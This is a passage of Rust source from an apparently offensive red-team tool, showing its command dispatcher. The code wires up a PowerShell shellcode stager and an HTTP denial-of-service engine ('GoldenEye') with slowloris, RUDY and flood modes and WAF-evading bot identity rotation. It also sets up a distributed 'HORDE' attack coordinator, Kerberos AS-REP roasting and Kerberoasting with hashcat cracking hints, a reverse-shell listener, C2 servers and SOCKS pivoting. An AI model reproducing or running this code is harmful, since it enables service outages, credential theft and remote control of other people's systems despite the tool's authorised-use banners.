            cli.encode_seed,
            payload.layer_count
        );
        println!("  \x1b[36mPS1 stager:\x1b[0m");
        println!(
            "{}",
            &payload.ps1_stager[..payload.ps1_stager.len().min(400)]
        );
        // Sauvegarder le stager
        let stager_path = "shellcode_stager.ps1";
        std::fs::write(stager_path, &payload.ps1_stager)?;
        println!("\n  💾 Stager sauvegardé: {}", stager_path);
        return Ok(());
    }

    if cli.attack_layer {
        use crate::report_gen::{enrich_findings_with_attack, generate_attack_navigator_layer};
        println!("\n  \x1b[38;5;196m▍ MITRE ATT&CK NAVIGATOR LAYER\x1b[0m");
        let cve_db_path = resolve_config_path(&cli.cve_db);
        let cve_entries: Vec<String> = if std::path::Path::new(&cve_db_path).exists() {
            crate::cve::load_cve_db(&cve_db_path)
                .map(|db| db.keys().take(20).cloned().collect())
                .unwrap_or_default()
        } else {
            vec![]
        };
        let mut f: Vec<crate::report_gen::Finding> = cve_entries
            .iter()
            .enumerate()
            .map(|(i, id)| crate::report_gen::Finding {
                id: format!("F{:03}", i + 1),
                title: format!("{} — Détecté lors du scan", id),
                severity: "HIGH".into(),
                cvss_score: 7.5,
                cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N".into(),
                cve: Some(id.clone()),
                affected: vec!["scan target".into()],
                description: format!("CVE détectée: {}", id),
                impact: "Potentielle compromission".into(),
                business_risk: "Impact sur la confidentialité des données".into(),
                evidence: vec![],
                remediation: "Appliquer le patch de sécurité".into(),
                references: vec![],
                mitre_id: None,
            })
            .collect();
        enrich_findings_with_attack(&mut f);

        let campaign = format!("scan_{}", chrono::Local::now().format("%Y%m%d_%H%M%S"));
        let layer = generate_attack_navigator_layer(&f, &campaign);
        let layer_path = cli.output.replace(".json", ".attack_layer.json");
        std::fs::write(&layer_path, &layer)?;
        println!(
            "  \x1b[32m[+]\x1b[0m ATT&CK Navigator layer → {}",
            layer_path
        );
        println!("  \x1b[90mImporter sur: https://mitre-attack.github.io/attack-navigator/\x1b[0m");
        return Ok(());
    }

    if let Some(ref dir) = cli.export_full.clone() {
        use crate::report_gen::{export_full_report, ReportBuilder};
        println!(
            "\n  \x1b[38;5;196m▍ EXPORT RAPPORT COMPLET\x1b[0m  → {}",
            dir
        );
        let client_name = cli.client_name.as_deref().unwrap_or("Client Red Team");
        let scan_id = format!("scan_{}", chrono::Local::now().format("%Y%m%d_%H%M%S"));
        let mut report = ReportBuilder::new(client_name, &scan_id, "Black Box")
            .compute_executive_summary()
            .build();
        match export_full_report(&mut report, dir) {
            Ok(files) => {
                println!("  \x1b[32m[+]\x1b[0m {} fichiers générés:", files.len());
                for f in &files {
                    println!("      → {}", f);
                }
            }
            Err(e) => eprintln!("  \x1b[38;5;196m[ERR]\x1b[0m Export: {}", e),
        }
        return Ok(());
    }

    if let Some(session_id) = cli.socks_via_session {
        use crate::pivot::start_socks5_via_session;
        use crate::shell::{SessionManager, GLOBAL_SESSIONS};
        let port = cli.socks_session_port;
        println!(
            "\n  \x1b[38;5;196m▍ SOCKS5 VIA SESSION {}\x1b[0m  127.0.0.1:{}",
            session_id, port
        );
        println!(
            "  \x1b[90mConfig proxychains: socks5 127.0.0.1 {}\x1b[0m",
            port
        );
        println!("  \x1b[90mUsage: proxychains4 nmap -sT -Pn 10.0.0.0/24\x1b[0m");
        let mgr = GLOBAL_SESSIONS.clone();
        return start_socks5_via_session(port, mgr, session_id)
            .await
            .map_err(|e| anyhow!("SOCKS5 session: {}", e));
    }

    // ── --dos-goldeneye : Stress Test HTTP / DoS résilience ──────────────────
    if let Some(ref url) = cli.dos_goldeneye.clone() {
        use crate::stress::goldeneye::{
            parse_user_agents_file, report_summary, run_goldeneye, AttackMode, DosMethod,
            GoldenEyeConfig,
        };
        use ansi::*;
        let fire2 = "\x1b[38;5;196m";
        let fire3 = "\x1b[38;5;214m";
        let matrix = "\x1b[38;5;48m";
        let method = DosMethod::from_str(&cli.dos_method).ok_or_else(|| {
            anyhow!(
                "--dos-method invalide '{}' (attendu: get|post|random)",
                cli.dos_method
            )
        })?;
        let attack = AttackMode::from_str(&cli.dos_mode).ok_or_else(|| {
            anyhow!(
                "--dos-mode invalide '{}' (attendu: flood|slowloris|rudy|browser)",
                cli.dos_mode
            )
        })?;
        let uas = if let Some(ref p) = cli.dos_useragents {
            match parse_user_agents_file(p) {
                Ok(v) if !v.is_empty() => Some(v),
                Ok(_) => {
                    println!("  ⚠️  Fichier UA vide: fallback UA modernes randomisés");
                    None
                }
                Err(e) => {
                    eprintln!("  ❌ Lecture UA échouée: {}", e);
                    return Err(e);
                }
            }
        } else {
            None
        };

        let custom_paths = cli.dos_browser_paths.clone().filter(|v| !v.is_empty());

        // ── Clamp OPSEC pour Flood legacy HTTPS ───────────────────────────
        //    500 sockets/worker en série sur un seul thread TLS = débit nul.
        //    On clamp automatiquement et on affiche un warning.
        const LEGACY_HTTPS_MAX_SPW: usize = 28;
        const LEGACY_HTTP_MAX_SPW: usize = 200;
        let is_ssl_target = url.starts_with("https://");
        let want_legacy = matches!(attack, AttackMode::Flood) && cli.dos_sockets_per_worker >= 50;
        let clamped_spw: Option<usize> = if want_legacy
            && is_ssl_target
            && cli.dos_sockets_per_worker > LEGACY_HTTPS_MAX_SPW
        {
            Some(LEGACY_HTTPS_MAX_SPW)
        } else if want_legacy && !is_ssl_target && cli.dos_sockets_per_worker > LEGACY_HTTP_MAX_SPW
        {
            Some(LEGACY_HTTP_MAX_SPW)
        } else {
            None
        };
        let effective_spw = clamped_spw.unwrap_or(cli.dos_sockets_per_worker);
        let effective_workers = if clamped_spw.is_some() && cli.dos_workers > 24 {
            // Si on clamp les sockets, on peut monter le nb de workers pour tenir la charge
            cli.dos_workers.min(32)
        } else {
            cli.dos_workers
        };

        let cfg = GoldenEyeConfig {
            url: url.clone(),
            workers: effective_workers,
            sockets_per_worker: effective_spw,
            method,
            verify_ssl: !cli.dos_nosslcheck,
            duration_secs: cli.dos_duration,
            connect_timeout_ms: cli.dos_connect_timeout,
            read_timeout_ms: cli.dos_read_timeout,
            user_agents: uas,
            debug: cli.dos_debug,
            attack_mode: attack,
            num_bots: cli.dos_bots,
            max_concurrent_bots: cli.dos_bots_concurrent,
            rotate_fingerprint_on_403: !cli.dos_no_rotate_fingerprint,
            send_client_hints: !cli.dos_no_client_hints,
            send_sec_fetch: !cli.dos_no_sec_fetch,
            send_priority_header: !cli.dos_no_priority,
            use_early_data: cli.dos_early_data,
            slowloris_header_period_ms: cli.dos_slowloris_period,
            rudy_chunk_size: cli.dos_rudy_chunk,
            rudy_chunk_delay_ms: cli.dos_rudy_delay,
            browser_paths: custom_paths.unwrap_or_default(),
            bot_id_offset: 0,
        };

        let legacy = matches!(attack, AttackMode::Flood) && cfg.sockets_per_worker >= 50;
        println!("\n  {BOLD}{fire2}▍ GOLDENEYE v3 — BOTS SOPHISTIQUÉS{RESET}");
        println!("  {GRIS}{}{RESET}", "▔".repeat(76));
        item("🎯", fire2, "URL cible", &cfg.url);
        item("⚔️", AMBER, "Mode d'attaque", attack.as_str());
        if want_legacy || legacy {
            item(
                "👷",
                CYAN,
                "Workers × sockets",
                &format!(
                    "{} × {} = {} ouverts",
                    cfg.workers,
                    cfg.sockets_per_worker,
                    cfg.workers.saturating_mul(cfg.sockets_per_worker)
                ),
            );
        } else {
            item(
                "🤖",
                VIOLET,
                "Personas BOT",
                &format!(
                    "{} distincts / max {} concurrents",
                    cfg.num_bots, cfg.max_concurrent_bots
                ),
            );
        }
        if let Some(clamped) = clamped_spw {
            let proto = if is_ssl_target { "HTTPS" } else { "HTTP" };
            let max = if is_ssl_target {
                LEGACY_HTTPS_MAX_SPW
            } else {
                LEGACY_HTTP_MAX_SPW
            };
            println!(
                "  ⚠️  {AMBER}CLAMP LEGACY {proto} : sockets/worker {} → {} (max {max}); \
                     privilégiez --dos-mode browser pour HTTPS load élevé{RESET}",
                cli.dos_sockets_per_worker, clamped
            );
        }
        item("🔀", AMBER, "Méthode HTTP", cfg.method.as_str());
        item(
            "🔐",
            MATRIX,
            "Vérif SSL/TLS",
            if cfg.verify_ssl {
                "TLS 1.2+ strict"
            } else {
                "désactivée"
            },
        );
        item(
            "⏱️",
            GRIS,
            "Durée limite",
            &cfg.duration_secs
                .map(|s| format!("{s}s"))
                .unwrap_or_else(|| "∞ illimitée (CTRL+C)".into()),
        );
        item(
            "🔄",
            AMBER,
            "Rotation fingerprint",
            if cfg.rotate_fingerprint_on_403 {
                "AUTO (3×403 → new persona)"
            } else {
                "désactivée"
            },
        );
        item(
            "🎭",
            VIOLET,
            "Client-Hints",
            if cfg.send_client_hints {
                "Sec-CH-UA (+GREASE anti-fingerprint)"
            } else {
                "OFF"
            },
        );
        item(
            "🛡️",
            CYAN,
            "Sec-Fetch Headers",
            if cfg.send_sec_fetch {
                "Site/Mode/Dest/User"
            } else {
                "OFF"
            },
        );
        if matches!(attack, AttackMode::Slowloris) {
            item(
                "🐌",
                fire2,
                "Slowloris stall",
                &format!("1 faux header / {} ms", cfg.slowloris_header_period_ms),
            );
        }
        if matches!(attack, AttackMode::Rudy) {
            item(
                "🐢",
                fire2,
                "RUDY flow",
                &format!(
                    "{} octets / chunk toutes les {} ms",
                    cfg.rudy_chunk_size, cfg.rudy_chunk_delay_ms
                ),
            );
        }
        if matches!(attack, AttackMode::BrowserFlood) {
            let n = cfg.browser_paths.len();
            item(
                "🧭",
                CYAN,
                "BrowserFlood paths",
                &format!(
                    "{} chemins (cookies + Set-Cookie persistants)",
                    if n > 0 {
                        n
                    } else {
                        10 /* défaut interne */
                    }
                ),
            );
        }
        item(
            "🚀",
            MATRIX,
            "Early-Data 0-RTT",
            if cfg.use_early_data { "ACTIVÉ" } else { "OFF" },
        );
        if let Some(n) = cfg.user_agents.as_ref() {
            item(
                "📱",
                GRIS,
                "UA personnalisés",
                &format!("{} entrées fichier", n.len()),
            );
        }
        println!("\n  {fire3}⚠️  MODE STRESS TEST — réservé aux infra AUTORISÉES (contrat écrit recommandé).{RESET}");
        println!();

        // ── LIVE DASHBOARD WS (OPSEC: bind 127.0.0.1 SEULEMENT) ──────────
        use crate::live_dashboard::LiveHub;
        let mut dashboard_server: Option<(
            tokio::task::JoinHandle<()>,
            std::sync::Arc<tokio::sync::Notify>,
        )> = None;
        let mut emit: Option<crate::live_dashboard::DashboardEmitter> = None;
        if cli.dashboard_live {
            match LiveHub::bind(cli.dashboard_port).await {
                Ok(hub) => {
                    let port = hub.bind_port();
                    let emitter = hub.emitter();
                    let stop = std::sync::Arc::new(tokio::sync::Notify::new());
                    let stop_c = stop.clone();
                    let server_handle = tokio::spawn(async move {
                        tokio::select! {
                            _ = hub.serve() => {},
                            _ = stop_c.notified() => {},
                        }
                    });
                    println!("  {CYAN}🎡 DASHBOARD LIVE · http://127.0.0.1:{port}{RESET}");
                    println!("  {GRIS}   Websocket: ws://127.0.0.1:{port}/ws · onglet 🔥 DDoS Live → métriques bots temps réel{RESET}");
                    println!("  {GRIS}   Bind: 127.0.0.1 SEULEMENT (OPSEC) — aucune exposition réseau extérieure{RESET}");
                    dashboard_server = Some((server_handle, stop));
                    emit = Some(emitter);
                    // Auto-open browser (same behavior as OSINT/scan flows)
                    let url = format!("http://127.0.0.1:{port}");
                    if !cli.no_dashboard_auto_open {
                        use crate::live_dashboard::open_browser;
                        match open_browser(&url) {
                            Ok(_) => println!("  {GRIS}   🖥  Navigateur ouvert : {url}{RESET}"),
                            Err(_) => println!("  {GRIS}   ℹ️  Ouvrez manuellement : {url}{RESET}"),
                        }
                    } else {
                        println!("  {GRIS}   ℹ️  Ouvrez : {url}{RESET}");
                    }
                    println!();
                }
                Err(e) => {
                    eprintln!("  ⚠  Dashboard live indisponible: {e}");
                    eprintln!("     → Stress test poursuit en mode classique (métriques uniquement sur console).");
                }
            }
        }

        let started_at = std::time::Instant::now();
        let stats = run_goldeneye(&cfg, emit).await?;
        let elapsed = started_at.elapsed();

        // Cleanup dashboard proprement
        if let Some((handle, stop)) = dashboard_server {
            stop.notify_one();
            tokio::time::timeout(std::time::Duration::from_millis(400), handle)
                .await
                .ok();
        }

        println!();
        rule("RÉSULTATS GOLDENEYE v3", fire2);
        let hits = stats.hits();
        let fails = stats.fails();
        let total = hits.saturating_add(fails);
        let ratio = if fails == 0 {
            String::from("∞")
        } else {
            format!("{:.2}", hits as f64 / fails as f64)
        };
        let rps = if elapsed.as_secs_f64() > 0.0 {
            format!("{:.0} req/s", total as f64 / elapsed.as_secs_f64())
        } else {
            String::from("-")
        };
        let c2x = stats.code_2xx.load(std::sync::atomic::Ordering::Relaxed);
        let c3x = stats.code_3xx.load(std::sync::atomic::Ordering::Relaxed);
        let c4x = stats.code_4xx.load(std::sync::atomic::Ordering::Relaxed);
        let c5x = stats.code_5xx.load(std::sync::atomic::Ordering::Relaxed);
        let waf = stats.waf_blocks.load(std::sync::atomic::Ordering::Relaxed);
        let rot = stats
            .bots_rotated
            .load(std::sync::atomic::Ordering::Relaxed);
        let mb_tx =
            stats.bytes_sent.load(std::sync::atomic::Ordering::Relaxed) as f64 / (1024.0 * 1024.0);
        let mb_rx =
            stats.bytes_recv.load(std::sync::atomic::Ordering::Relaxed) as f64 / (1024.0 * 1024.0);
        item("✅ HITS", MATRIX, "Requêtes 2xx/3xx", &format!("{hits}"));
        item(
            "❌ FAILS",
            fire2,
            "Requêtes 4xx/5xx/err",
            &format!("{fails}"),
        );
        item("📦 Σ", CYAN, "Total requêtes", &format!("{total}"));
        item("📈 Ratio", AMBER, "Hits / Fails", &ratio);
        item("💨 Débit", VIOLET, "Throughput", &rps);
        item(
            "⏱️ Tps",
            GRIS,
            "Durée effective",
            &format!("{:.2}s", elapsed.as_secs_f64()),
        );
        println!();
        rule("RÉPARTITION HTTP par statut", matrix);
        item("🟢 2xx", "\x1b[38;5;46m", "Succès", &format!("{c2x}"));
        item(
            "🟡 3xx",
            "\x1b[38;5;226m",
            "Redirections",
            &format!("{c3x}"),
        );
        item(
            "🟠 4xx",
            "\x1b[38;5;208m",
            "Erreurs client",
            &format!("{c4x}"),
        );
        item(
            "🔴 5xx",
            "\x1b[38;5;196m",
            "Erreurs serveur",
            &format!("{c5x}"),
        );
        item(
            "🚫 WAF",
            "\x1b[38;5;196m",
            "Blocages 403/429 détectés",
            &format!("{waf}"),
        );
        item(
            "🔄 Rot",
            AMBER,
            "Rotations d'identité WAF",
            &format!("{rot}"),
        );
        item("⬆️ TX", CYAN, "Trafic montant", &format!("{mb_tx:.2} MB"));
        item(
            "⬇️ RX",
            VIOLET,
            "Trafic descendant",
            &format!("{mb_rx:.2} MB"),
        );

        let probably_down = hits > 100 && fails > 0 && (fails as f64 / total as f64) > 0.9;
        if probably_down {
            println!("\n  {BOLD}{fire2}▍ SERVEUR POTENTIELLEMENT DOWN{RESET} (ratio fails > 90%)");
            println!("  {GRIS}Conseil: attendre 30s puis relancer un --targets standard avec HTTP banner grab{RESET}");
        } else if waf > 0 {
            println!("\n  {BOLD}{AMBER}▍ WAF / CDN DÉTECTÉ{RESET} — {waf} réponses 403/429 → {rot} rotations d'identité bots");
            println!("  {GRIS}Chaque rotation génère un nouveau fingerprint : UA, Client-Hints, Fingerprint hash, cookies.{RESET}");
        } else {
            println!("\n  {MATRIX}ℹ️  Interprétation:{RESET} plus le ratio HITS/FAILS est élevé, plus le serveur résiste.");
            println!("  {GRIS}Plateau HITS + hausse FAILS = saturation atteinte (Max Conns / workers pool épuisé).{RESET}");
        }

        let summary = report_summary(&stats, &cfg);
        let json_out = cli.output.replace(".json", ".goldeneye.json");
        match serde_json::to_string_pretty(&summary) {
            Ok(j) => {
                let _ = std::fs::write(&json_out, &j);
                println!("\n  💾 JSON report       : {CYAN}{}{RESET}", json_out);
            }
            Err(e) => {
                eprintln!("  ⚠️  Écriture JSON échouée: {}", e);
            }
        }

        if cli.md.unwrap_or(false) {
            let md_out = cli.output.replace(".json", ".goldeneye.md");
            let bots_descr = if legacy {
                format!("Legacy {}×{} sockets", cfg.workers, cfg.sockets_per_worker)
            } else {
                format!(
                    "{} BOTs distincts (max {} concurrents Tokio)",
                    cfg.num_bots, cfg.max_concurrent_bots
                )
            };
            let md = format!(
                "# GoldenEye v3 Stress Test — Rapport\n\n\
                 - **Cible**: `{}`\n\
                 - **Mode d'attaque**: {}  \n\
                 - **Méthode HTTP**: {}  \n\
                 - **TLS**: {}  \n\
                 - **Durée**: {:.2}s  \n\
                 - **BOTs**: {}  \n\
                 - **Client-Hints**: {}  \n\
                 - **Sec-Fetch**: {}  \n\
                 - **Rotation fingerprint**: {}\n\n\
                 | Métrique | Valeur |\n\
                 |----------|--------|\n\
                 | HITS ✅  | {} |\n\
                 | FAILS ❌ | {} |\n\
                 | Σ TOTAL  | {} |\n\
                 | Ratio H/F | {} |\n\
                 | Débit (req/s) | {} |\n\
                 | HTTP 2xx | {} |\n\
                 | HTTP 3xx | {} |\n\
                 | HTTP 4xx | {} |\n\
                 | HTTP 5xx | {} |\n\
                 | WAF 403/429 | {} |\n\
                 | Rotations fingerprint | {} |\n\
                 | Trafic TX (MB) | {:.2} |\n\
                 | Trafic RX (MB) | {:.2} |\n\
                 | Serveur probablement DOWN | {} |\n",
                cfg.url,
                attack.as_str(),
                cfg.method.as_str(),
                if cfg.verify_ssl {
                    "vérifié TLS 1.2+"
                } else {
                    "désactivé"
                },
                elapsed.as_secs_f64(),
                bots_descr,
                cfg.send_client_hints,
                cfg.send_sec_fetch,
                cfg.rotate_fingerprint_on_403,
                hits,
                fails,
                total,
                ratio,
                rps,
                c2x,
                c3x,
                c4x,
                c5x,
                waf,
                rot,
                mb_tx,
                mb_rx,
                probably_down
            );
            let _ = std::fs::write(&md_out, md);
            println!("  📝 Markdown report   : {CYAN}{}{RESET}", md_out);
        }

        return Ok(());
    }

    // ── Mission Pack: --mission-new (créer pack neuf) ──────────────────────
    if let Some(ref pack_path) = cli.mission_new {
        use crate::mission_pack::MissionPack;
        use ansi::*;
        rule("MISSION PACK · CRÉATION", AMBER);
        let pwd = cli.mission_password.as_deref();
        let name = cli
            .mission_name
            .clone()
            .unwrap_or_else(|| format!("Mission-{}", chrono::Local::now().format("%Y%m%d-%H%M%S")));
        let client = cli.client_name.clone();
        let scope = cli.mission_scope.clone().unwrap_or_else(|| {
            "Scope précis transmis par le client (compléter après réception du ROE)".into()
        });
        let targets = cli.mission_targets.clone().unwrap_or_default();
        let operator = cli.mission_operator.clone().or_else(|| {
            std::env::var("USERNAME")
                .ok()
                .or_else(|| std::env::var("USER").ok())
        });
        item("📁", CYAN, "Pack path", pack_path);
        item("📋", MATRIX, "Nom mission", &name);
        item(
            "🏢",
            GRIS,
            "Client",
            client.as_deref().unwrap_or("(à renseigner)"),
        );
        item(
            "👤",
            GRIS,
            "Opérateur",
            operator.as_deref().unwrap_or("(anonyme)"),
        );
        item(
            "🎯",
            AMBER,
            "Cibles scope",
            &format!("{} entrée(s)", targets.len()),
        );
        item(
            "🔑",
            VIOLET,
            "Clé chiffrement",
            if pwd.is_some() {
                "password --mission-password"
            } else {
                "C2_MASTER_KEY (HKDF mission-pack/v1)"
            },
        );
        println!();
        match MissionPack::create_new(pack_path, pwd, name, client, scope, targets, operator) {
            Ok(mut mp) => {
                mp.persist().ok();
                println!("  {MATRIX}✔{RESET} Pack créé avec succès — chiffré AES-256-GCM, clé = HKDF(C2_MASTER, info=mission-pack/v1)");
                println!("  {GRIS}Astuce: combinez --mission-open {pack_path} avec --targets + --mission-autocapture pour persister les nodes à chaque scan.{RESET}");
            }
            Err(e) => println!("  {RED}✗{RESET} Échec création pack: {e}"),
        }
        return Ok(());
    }

    // ── Mission Pack: commandes qui agissent SUR un pack ouvert (new fini + open requis)
    //    Déclaré ici, vivra jusqu'en fin de run() pour auto-capture nodes
    let mut maybe_pack: Option<crate::mission_pack::MissionPack> = None;
    if let Some(ref pack_path) = cli.mission_open {
        use crate::mission_pack::MissionPack;
        let pwd = cli.mission_password.as_deref();
        match MissionPack::open_existing(pack_path, pwd) {
            Ok(mp) => {
                maybe_pack = Some(mp);
            }
            Err(e) => {
                println!("  {RED}✗ Mission pack{RESET} impossible d'ouvrir {pack_path}: {e}");
                return Ok(());
            }
        }
    }
    // Flag de fermeture finale à la fin du run si --mission-autocapture + pack ouvert
    let autocapture = cli.mission_open.is_some() && cli.mission_autocapture;

    if let Some(ref mut pack) = maybe_pack {
        use ansi::*;
        let fire = "\x1b[38;5;197m";
        if cli.mission_list {
            rule("MISSION PACK · RÉSUMÉ", AMBER);
            let i = pack.inner();
            item("🆔", GRIS, "Pack ID", &i.id);
            item("📋", MATRIX, "Nom", &i.name);
            item(
                "🏢",
                GRIS,
                "Client",
                i.client_name.as_deref().unwrap_or("(non renseigné)"),
            );
            item("🔵", AMBER, "État", &format!("{}", i.state.label()));
            item(
                "👤",
                GRIS,
                "Opérateur",
                i.operator.as_deref().unwrap_or("anonyme"),
            );
            item(
                "📅",
                GRIS,
                "Création",
                &i.created_at
                    .with_timezone(&chrono::Local)
                    .format("%Y-%m-%d %H:%M:%S")
                    .to_string(),
            );
            item(
                "✏️",
                GRIS,
                "Modification",
                &i.last_modified
                    .with_timezone(&chrono::Local)
                    .format("%Y-%m-%d %H:%M:%S")
                    .to_string(),
            );
            item(
                "🎯",
                AMBER,
                "Cibles autorisées",
                &format!("{}", i.targets.len()),
            );
            item("📡", CYAN, "Scans exécutés", &format!("{}", i.scans_run));
            item("🌐", GRIS, "Nodes", &format!("{}", i.nodes.len()));
            item("⚠️", GRIS, "Findings", &format!("{}", i.findings.len()));
            item("📝", GRIS, "Notes op.", &format!("{}", i.notes.len()));
            item("📊", GRIS, "Événements", &format!("{}", i.events.len()));
            item("🔓", VIOLET, "CVEs total", &format!("{}", i.cves_total));
            item(
                "🎲",
                AMBER,
                "Risques breakdown",
                &format!(
                    "CRITICAL:{} HIGH:{} MED:{} LOW:{} INFO:{}",
                    i.critical_count, i.high_count, i.medium_count, i.low_count, i.info_count
                ),
            );
            item("💾", CYAN, "Exports", &format!("{}", i.exports_generated));
            rule("DERNIERS ÉVÉNEMENTS", GRIS);
            let tail = i.events.iter().rev().take(10).collect::<Vec<_>>();
            for (idx, ev) in tail.iter().enumerate() {
                let ts = ev.ts.with_timezone(&chrono::Local).format("%H:%M:%S");
                println!(
                    "  {GRIS}{ts}{RESET} · {MATRIX}[{kind}]{RESET} {title}",
                    ts = ts,
                    kind = ev.kind.label(),
                    title = ev.title
                );
                if idx == tail.len().saturating_sub(1) {
                    println!();
                }
            }
            if let Some(ref scope) = Some(i.scope_text.as_str()).filter(|s| !s.is_empty()) {
                println!("  {AMBER}▸ Scope autorisé ROE:{RESET}");
                for line in scope.lines().take(6) {
                    println!("    {GRIS}│{RESET} {}", line);
                }
            }
        }

        if let Some(ref title) = cli.mission_add_note {
            let body = cli
                .mission_note_body
                .clone()
                .unwrap_or_else(|| "(corps vide)".into());
            let author = cli.mission_operator.clone().unwrap_or_else(|| {
                std::env::var("USERNAME")
                    .ok()
                    .or_else(|| std::env::var("USER").ok())
                    .unwrap_or_else(|| "anon".into())
            });
            let tags = cli.mission_note_tags.clone().unwrap_or_default();
            let id = pack.add_note(title.clone(), body, author, tags);
            match pack.persist() {
                Ok(()) => println!(
                    "  {MATRIX}✔{RESET} Note ajoutée · id={GRIS}{id}{RESET} · title={title}"
                ),
                Err(e) => println!("  {RED}✗{RESET} Persist échec: {e}"),
            }
        }

        if let Some(ref out) = cli.mission_export_json {
            match pack.export_report_json() {
                Ok(bytes) => {
                    std::fs::write(out, bytes).ok();
                    pack.mark_export(&format!("JSON sidecar: {out}"));
                    pack.persist().ok();
                    println!("  {MATRIX}✔{RESET} Export JSON livrable : {CYAN}{out}{RESET}");
                }
                Err(e) => println!("  {RED}✗{RESET} Export: {e}"),
            }
        }

        if cli.mission_close_wipe {
            println!("  {fire}⚠{RESET} Fermeture + NIST SP 800-88 secure wipe 3 passes sur le pack — IRRÉVERSIBLE");
            println!("  {GRIS}Avant wipe: persist des notes, findings et events en cours…{RESET}");
            match pack.close_and_wipe() {
                Ok(()) => println!("  {MATRIX}✔{RESET} Pack fermé et effacé de façon sûre (0x00, 0xFF, random + fsync)."),
                Err(e) => println!("  {RED}✗{RESET} Wipe échec: {e}"),
            }
            return Ok(());
        }
    }

    // ── --asrep-roast / --kerberoast : attaques Kerberos ────────────────────
    if cli.asrep_roast || cli.kerberoast {
        use crate::kerberos::{asrep_roast_real, kerberoast_impacket, KerberosConfig};
        let dc_ip = cli.dc_ip.as_deref().unwrap_or("").to_string();
        if dc_ip.is_empty() {
            println!("  [Kerberos] --dc-ip requis");
            return Ok(());
        }
        let domain = cli.ad_domain.as_deref().unwrap_or("").to_string();
        if domain.is_empty() {
            println!("  [Kerberos] --ad-domain requis (ex: corp.local)");
            return Ok(());
        }
        let cfg = KerberosConfig {
            dc_ip,
            domain,
            username: cli.ad_user.clone(),
            password: cli.ad_pass.clone(),
            ntlm: None,
            timeout: 5,
            auto_install: cli.auto_install,
            assume_yes: cli.yes,
        };
        // Charger la liste d'utilisateurs
        let userlist: Vec<String> = if let Some(ref file) = cli.userlist {
            std::fs::read_to_string(file)
                .unwrap_or_default()
                .lines()
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty())
                .collect()
        } else {
            crate::bruteforce::default_usernames()
                .iter()
                .map(|s| s.to_string())
                .collect()
        };

        if cli.asrep_roast {
            let hashes = asrep_roast_real(&cfg, &userlist).await;
            if !hashes.is_empty() {
                let hash_file = cli.output.replace(".json", ".asrep.hash");
                let content = hashes
                    .iter()
                    .map(|h| h.hash.as_str())
                    .collect::<Vec<_>>()
                    .join("\n");
                let _ = std::fs::write(&hash_file, content);
                println!(
                    "  💾 AS-REP hashes: {} (hashcat -m 18200 {} rockyou.txt)",
                    hash_file, hash_file
                );
            }
        }
        if cli.kerberoast {
            let hashes = kerberoast_impacket(&cfg).await;
            if !hashes.is_empty() {
                let hash_file = cli.output.replace(".json", ".tgs.hash");
                let content = hashes
                    .iter()
                    .map(|h| h.hash.as_str())
                    .collect::<Vec<_>>()
                    .join("\n");
                let _ = std::fs::write(&hash_file, content);
                println!(
                    "  💾 TGS hashes: {} (hashcat -m 13100 {} rockyou.txt)",
                    hash_file, hash_file
                );
            }
        }
        return Ok(());
    }

    // ── --listen : reverse shell listener ─────────────────────────────────────
    if cli.listen {
        use crate::shell::{start_tcp_listener, SessionManager, GLOBAL_SESSIONS};
        let mgr = GLOBAL_SESSIONS.clone();
        println!(
            "\n  \x1b[38;5;196m[SHELL]\x1b[0m Listener démarré sur {}:{}",
            cli.lhost, cli.lport
        );
        return start_tcp_listener(&cli.lhost, cli.lport, mgr)
            .await
            .map_err(|e| anyhow::anyhow!(e.to_string()));
    }

    // ── --c2-server : C2 HTTP ─────────────────────────────────────────────────
    if cli.c2_server {
        use crate::c2::{C2Server, HttpC2};
        let server = C2Server::new();
        let http = HttpC2::new(server).map_err(|e| anyhow::anyhow!(e.to_string()))?;
        return http
            .start("0.0.0.0", cli.c2_port)
            .await
            .map_err(|e| anyhow::anyhow!(e.to_string()));
    }

    // ── --ws-c2 : C2 WebSocket bidirectionnel push ────────────────────────────
    if cli.ws_c2 {
        use crate::c2::{C2Server, WsC2Server};
        let server = C2Server::new();
        let ws_c2 = WsC2Server::new(server);
        return ws_c2
            .start("0.0.0.0", cli.ws_c2_port)
            .await
            .map_err(|e| anyhow::anyhow!(e.to_string()));
    }

    // ── --ws-shell : shell interactif WebSocket ───────────────────────────────
    if cli.ws_shell {
        use crate::c2::ws_c2::start_ws_shell_server;
        use crate::shell::{SessionManager, GLOBAL_SESSIONS};
        let mgr = GLOBAL_SESSIONS.clone();
        return start_ws_shell_server(cli.ws_shell_port, mgr)
            .await
            .map_err(|e| anyhow::anyhow!(e.to_string()));
    }

    // ── --horde-coordinator : serveur central HORDE ─────────────────────────
    if cli.horde_coordinator {
        use crate::horde::crypto::horde_load_master;
        use crate::stress::goldeneye::{
            parse_user_agents_file, AttackMode, DosMethod, GoldenEyeConfig,
        };
        use ansi::*;
        splash_header();
        rule("HORDE COORDINATOR — Infra Volumétrique", "\x1b[38;5;196m");
        let master_key = horde_load_master(cli.horde_key.as_deref())
            .map_err(|e| anyhow!("--horde-key / env HORDE_MASTER_KEY: {:?}", e))?;
        let bind_addr = if cli.horde_public {
            if cli.horde_bind.trim() != "127.0.0.1" {
                cli.horde_bind.clone()
            } else {
                "0.0.0.0".to_string()
            }
        } else {
            if cli.horde_bind != "127.0.0.1" {
                println!("  {AMBER}⚠️  OPSEC --horde-bind={} sans --horde-public → fallback 127.0.0.1{RESET}", cli.horde_bind);
            }
            "127.0.0.1".to_string()
        };
        println!(
            "  {MATRIX}[*]{RESET} Bind:       {CYAN}{addr}:{port}{RESET}",
            addr = &bind_addr,
            port = cli.horde_port
        );
        println!(
            "  {MATRIX}[*]{RESET} Total bots: {VIOLET}{}{RESET}",
            cli.horde_total_bots
        );
        println!(
            "  {MATRIX}[*]{RESET} Adaptatif:  {AMBER}{}{RESET}",
            cli.horde_adapt
        );
        if let Some(d) = cli.horde_duration {
            println!("  {MATRIX}[*]{RESET} Durée max:  {GRIS}{}s{RESET}", d);
        }
        // Construire template GoldenEye depuis flags --dos-* réutilisables
        let method = DosMethod::from_str(&cli.dos_method)
            .ok_or_else(|| anyhow!("--dos-method invalide '{}'", cli.dos_method))?;
        let attack = AttackMode::from_str(&cli.dos_mode)
            .ok_or_else(|| anyhow!("--dos-mode invalide '{}'", cli.dos_mode))?;
        let uas = if let Some(ref p) = cli.dos_useragents {
            match parse_user_agents_file(p) {
                Ok(v) if !v.is_empty() => Some(v),
                _ => None,
            }
        } else {
            None
        };
